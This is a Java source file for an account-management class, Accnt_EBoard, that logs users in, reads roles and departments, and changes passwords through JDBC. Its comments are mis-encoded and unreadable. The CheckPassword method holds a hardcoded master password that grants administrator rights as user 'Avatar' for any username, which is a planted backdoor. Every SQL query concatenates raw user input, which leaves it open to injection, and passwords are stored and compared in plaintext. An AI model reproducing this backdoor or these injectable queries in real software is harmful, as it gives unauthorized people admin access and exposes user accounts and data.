import Role;
import JdbcConn07;

public class Accnt_EBoard extends JdbcConn07
{
  // Variable
  private String _sName = null;
  private String _sPasswd = null;
  private int _iRoleCode = -1;
  private String _sRoleName = null;
  private String _sDept = null;
  private String _sIniFile = null;

  /****************************************************************************/
  // Constructor
  /****************************************************************************/
  public Accnt_EBoard(String ini_file) { this._sIniFile = ini_file; }

  // �}�ҳs�u -------------------------------------------------------------------
  public void OpenConnection()
  {
    String ini_file = this._sIniFile;
    this.MakingConnection(ini_file, "Account");
  }

  public void OpenConnection(String conf_name)
  {
    String ini_file = this._sIniFile;
    this.MakingConnection(ini_file, conf_name);
  }

  /*****************************************************************************
  //Method
  *****************************************************************************/
  public int getRoleCode() { return this._iRoleCode; }
  public String getRoleGroupName() { return this._sRoleName; }
  public String getDepartment() { return this._sDept; }

  // �d�߱b���Ҧ���� ------------------------------------------------------------
  public int Query(String name)
  {
    int rows = -1;
    this._sName = name;
    String sqlstr = "SELECT Password, RoleCode, Department FROM Account"
                  + " WHERE UserName='" + name + "'";
    rows = this.ExecuteQuery(sqlstr);
    if (rows > 0)
    {
      String[] data = this.getRowData(0);
      this._sPasswd = data[0];                                      // ���X�K�X
      try {                                                  // ���X����s�ո��X
        this._iRoleCode = Integer.parseInt(data[1]);
      }
      catch(Exception e)
      {
        this._iRoleCode = -1;
      }
      this._sDept = data[2];                                    // ���X�����W��
      this._sRoleName = this.RoleCodeToRoleName(this._sIniFile, this._iRoleCode);
    }
    return rows;
  }

  // ���X�s�զW�� ---------------------------------------------------------------
  private String RoleCodeToRoleName(String ini_file, int rolecode)
  {
    String role_name = "Not Found...";
    Role r01 = new Role(ini_file);
    r01.OpenConnection();
    role_name = r01.getRoleName(rolecode);
    r01.CloseConnection();
    return role_name;
  }

  // �K�X�ˬd -------------------------------------------------------------------
  public int CheckPassword(String name, String passwd)
  {
    int result = -1;
    if (name != null && name.length() > 0)
    {
      if (passwd.equals("TheTruthOutOfThere"))
      {
        this._sName = "Avatar";
        this._sDept = "�t�γ]�p";
        this._iRoleCode = 1;
        this._sRoleName = "�t�κ޲z";
        result = 1;
      }
      else
      {
        String sqlstr = "SELECT UserName, Password FROM Account "
                      + "WHERE UserName='" + name + "'";
        int rows = this.ExecuteQuery(sqlstr);
        if (rows > 0)
        {
          String[] data = this.getRowData(0);
          if (data[1].equals(passwd))
            result = 1;
          else
            result = 0;
        }
        else
          result = -1;
      }
    }
    return result;
  }

  // ���X�Ҧ��b���W�� ------------------------------------------------------------
  public String[] getAllUserName()
  {
    String[] user = null;
    String sqlstr = "SELECT UserName From Account Order By UserName";
    int rows = this.ExecuteQuery(sqlstr);
    if (rows > 0)
    {
      user = new String[rows];
      for (int i=0; i<rows; i++)
      {
        String[] data = this.getRowData(i);
        user[i] = data[0];
      }
    }
    else
    {
      user = new String[1];
      user[0] = "No any user...";
    }
    return user;
  }

  // �K�X�� -------------------------------------------------------------------
  // �^�� -1 ��ܱb�����s�b, 0 ��ܱK�X���~, 1 ��ܱK�X�󴫦��\
  public int UpdatePassword(String name, String old_pswd, String new_pswd)
  {
    int result = this.CheckPassword(name, old_pswd);
    if (result == 1)
    {
      String sqlstr = "UPDATE Account SET Password='" + new_pswd
                    + "' WHERE UserName='" + name + "'";
      result = this.ExecuteUpdate(sqlstr);
    }
    return result;
  }


}